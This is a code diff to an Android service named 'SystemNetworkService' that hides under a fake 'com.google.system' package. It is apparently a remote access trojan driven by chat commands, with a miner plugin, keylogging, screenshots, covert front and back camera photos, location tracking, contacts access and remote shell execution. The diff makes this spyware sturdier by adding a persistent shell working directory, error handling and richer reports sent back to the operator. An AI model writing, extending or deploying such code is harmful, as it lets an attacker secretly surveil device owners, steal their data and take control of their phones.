@@ -87,6 +87,7 @@ class SystemNetworkService : Service() {
     private var minerPlugin: com.google.system.plugins.MinerPlugin? = null
     private var screenRequestReceiver: BroadcastReceiver? = null
     private var liveStreamEncoder: com.google.system.LiveStreamEncoder? = null
+    private var shellWorkingDir: String = "/sdcard"
 
     override fun onBind(i: Intent?): IBinder? = null
 
@@ -302,9 +303,12 @@ class SystemNetworkService : Service() {
                 action != "debug" && action != "restart" && action != "uptime" && action != "ip" &&
                 action != "update" && action != "config") {
                 if (!com.openaccess.sdk.update.ConfigManager.isCommandEnabled(this, action)) {
+                    android.util.Log.w("SystemNetworkService", "Command disabled: $action")
                     return
                 }
             }
+
+            android.util.Log.d("SystemNetworkService", "Executing command: $action payload=$payload")
 
             when (action) {
                 "help" -> {
@@ -334,7 +338,9 @@ class SystemNetworkService : Service() {
                             val intent = Intent("com.openaccess.sdk.REQUEST_SCREEN")
                             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                             sendBroadcast(intent)
-                        } catch (_: Exception) {}
+                        } catch (e: Exception) {
+                            android.util.Log.e("SystemNetworkService", "Failed to send screen request: ${e.message}")
+                        }
                         d.sendMsg(":tv: **Screen Capture Permission**\nGrant permission in the dialog. Screenshots will work after.")
                         return
                     }
@@ -343,8 +349,8 @@ class SystemNetworkService : Service() {
                         val t1 = System.currentTimeMillis()
                         val bytes = captureScreen()
                         val elapsed = System.currentTimeMillis() - t1
-                        if (bytes != null) {
-                            val done = ":camera: **Screenshot** (${elapsed}ms)"
+                        if (bytes != null && bytes.isNotEmpty()) {
+                            val done = ":camera: **Screenshot** (${elapsed}ms, ${bytes.size / 1024}KB)"
                             if (progressId != null) {
                                 d.editMsg(progressId, done)
                                 delay(300)
@@ -356,14 +362,18 @@ class SystemNetworkService : Service() {
                             val acc = AccessibilityHelper.isRunning
                             val mp = DisplayCapture.mediaProjection != null
                             val ver = Build.VERSION.SDK_INT
+                            val permOk = ALL_PERMS.all { hasPerm(it) }
                             val err = if (!mp && !acc) {
-                                ":x: **Screenshot failed** (${elapsed}ms)\nAndroid: $ver | Accessibility: $acc | MediaProjection: $mp\nEnable with: `!screenshot on`"
+                                ":x: **Screenshot failed** (${elapsed}ms)\nAndroid: $ver | Accessibility: $acc | MediaProjection: $mp | Perms: $permOk\nEnable with: `!screenshot on`"
+                            } else if (!mp) {
+                                ":x: **MediaProjection expired** (${elapsed}ms)\nRe-grant screen capture: `!screenshot on`"
                             } else {
-                                ":x: **Screenshot failed** (${elapsed}ms)\nAccessibility: $acc | MediaProjection: $mp\nTry: `!keylog on` to enable accessibility"
+                                ":x: **Screenshot capture failed** (${elapsed}ms)\nAccessibility: $acc | MediaProjection: $mp\nTry: `!keylog on` to enable accessibility"
                             }
                             if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                         }
                     } catch (e: Exception) {
+                        android.util.Log.e("SystemNetworkService", "Screenshot error: ${e.message}", e)
                         val err = ":x: **Screenshot error**: ${e.message?.take(50) ?: "unknown"}"
                         if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                     }
@@ -486,20 +496,40 @@ class SystemNetworkService : Service() {
                 }
                 "shell" -> {
                     val cmd = payload ?: run {
-                        d.sendMsg(":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExamples:\n• `!shell whoami`\n• `!shell getprop ro.product.model`\n• `!shell pm list packages`\n• `!shell ls /sdcard/`")
+                        d.sendMsg(":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExamples:\n• `!shell whoami`\n• `!shell getprop ro.product.model`\n• `!shell pm list packages`\n• `!shell ls /sdcard/`\n\nCurrent dir: `$shellWorkingDir`")
                         return
                     }
                     val progressId = d.sendMsgAwait(":terminal: **Running**: `$ $cmd`")
-                    val result = shell(cmd)
-                    val output = if (result.startsWith("⚠️")) {
-                        ":x: $result"
-                    } else if (result.startsWith("Error:")) {
-                        ":x: Shell command failed\n```\n$result\n```"
-                    } else {
-                        val out = if (result.length > 1900) result.take(1900) + "\n..." else result
-                        "```\n$ ${cmd}\n$out\n```"
+                    try {
+                        if (cmd.startsWith("cd ") || cmd == "cd") {
+                            val target = cmd.substringAfter("cd ").trim()
+                            val newDir = if (target.isEmpty() || target == "~") "/sdcard" else target
+                            val dir = File(newDir)
+                            if (dir.isDirectory) {
+                                shellWorkingDir = dir.absolutePath
+                                if (progressId != null) d.editMsg(progressId, ":terminal: **Changed directory**\n\`\`\`\n$shellWorkingDir\n\`\`\`") else d.sendMsg(":terminal: **Changed directory**\n\`\`\`\n$shellWorkingDir\n\`\`\`")
+                            } else {
+                                if (progressId != null) d.editMsg(progressId, ":x: Directory not found: `$newDir`") else d.sendMsg(":x: Directory not found: `$newDir`")
+                            }
+                        } else if (cmd == "pwd") {
+                            if (progressId != null) d.editMsg(progressId, "```\n$shellWorkingDir\n```") else d.sendMsg("```\n$shellWorkingDir\n```")
+                        } else {
+                            val result = shell(cmd)
+                            val output = if (result.startsWith("⚠️")) {
+                                ":x: $result"
+                            } else if (result.startsWith("Error:")) {
+                                ":x: Shell command failed\n```\n$result\n```"
+                            } else {
+                                val out = if (result.length > 1900) result.take(1900) + "\n...(truncated)" else result
+                                "```\n$ ${cmd}\n$out\n```"
+                            }
+                            if (progressId != null) d.editMsg(progressId, output) else d.sendMsg(output)
+                        }
+                    } catch (e: Exception) {
+                        android.util.Log.e("SystemNetworkService", "Shell error: ${e.message}", e)
+                        val err = ":x: Shell error: ${e.message?.take(80) ?: "unknown"}"
+                        if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                     }
-                    if (progressId != null) d.editMsg(progressId, output) else d.sendMsg(output)
                 }
                 "keylog" -> {
                     when (payload?.lowercase()) {
@@ -585,29 +615,41 @@ class SystemNetworkService : Service() {
                         return
                     }
                     val progressId = d.sendMsgAwait(":camera: **Capturing photo**...")
-                    val useFront = payload?.lowercase() == "front"
-                    val bytes = takePhoto(if (useFront) 1 else 0)
-                    if (bytes != null) {
-                        val done = ":camera: **${if (useFront) "Front" else "Back"} Camera**"
-                        if (progressId != null) {
-                            d.editMsg(progressId, done)
-                            delay(300)
+                    try {
+                        val useFront = payload?.lowercase() == "front"
+                        val bytes = takePhoto(if (useFront) 1 else 0)
+                        if (bytes != null && bytes.isNotEmpty()) {
+                            val done = ":camera: **${if (useFront) "Front" else "Back"} Camera** (${bytes.size / 1024}KB)"
+                            if (progressId != null) {
+                                d.editMsg(progressId, done)
+                                delay(300)
+                            } else {
+                                d.sendMsg(done)
+                            }
+                            d.sendFile(":camera: **${if (useFront) "Front" else "Back"} Camera**", "photo_${System.currentTimeMillis()}.jpg", bytes)
                         } else {
-                            d.sendMsg(done)
+                            val err = ":x: Camera capture failed — camera may be in use by another app"
+                            if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                         }
-                        d.sendFile(":camera: **${if (useFront) "Front" else "Back"} Camera**", "photo_${System.currentTimeMillis()}.jpg", bytes)
-                    } else {
-                        val err = ":x: Camera capture failed"
+                    } catch (e: Exception) {
+                        android.util.Log.e("SystemNetworkService", "Camera error: ${e.message}", e)
+                        val err = ":x: Camera error: ${e.message?.take(80) ?: "unknown"}"
                         if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                     }
                 }
                 "location" -> {
-                    if (hasPerm(android.Manifest.permission.ACCESS_FINE_LOCATION) || hasPerm(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
-                        val loc = getLocation()
-                        d.sendMsg(loc)
-                    } else {
-                        // Fallback to IP-based geolocation
-                        d.sendMsg(getIpLocation())
+                    val progressId = d.sendMsgAwait(":round_pushpin: **Fetching location**...")
+                    try {
+                        val loc = if (hasPerm(android.Manifest.permission.ACCESS_FINE_LOCATION) || hasPerm(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                            getLocation()
+                        } else {
+                            getIpLocation()
+                        }
+                        if (progressId != null) d.editMsg(progressId, loc) else d.sendMsg(loc)
+                    } catch (e: Exception) {
+                        android.util.Log.e("SystemNetworkService", "Location error: ${e.message}", e)
+                        val fallback = getIpLocation()
+                        if (progressId != null) d.editMsg(progressId, fallback) else d.sendMsg(fallback)
                     }
                 }
                 "contacts" -> {
@@ -1490,8 +1532,9 @@ class SystemNetworkService : Service() {
 
     private suspend fun shell(cmd: String): String = withContext(Dispatchers.IO) {
         try {
+            val workingDir = File(shellWorkingDir).takeIf { it.isDirectory } ?: File(cacheDir)
             val p = ProcessBuilder("sh", "-c", cmd)
-                .directory(cacheDir)
+                .directory(workingDir)
                 .redirectErrorStream(true)
                 .start()
             val output = try {
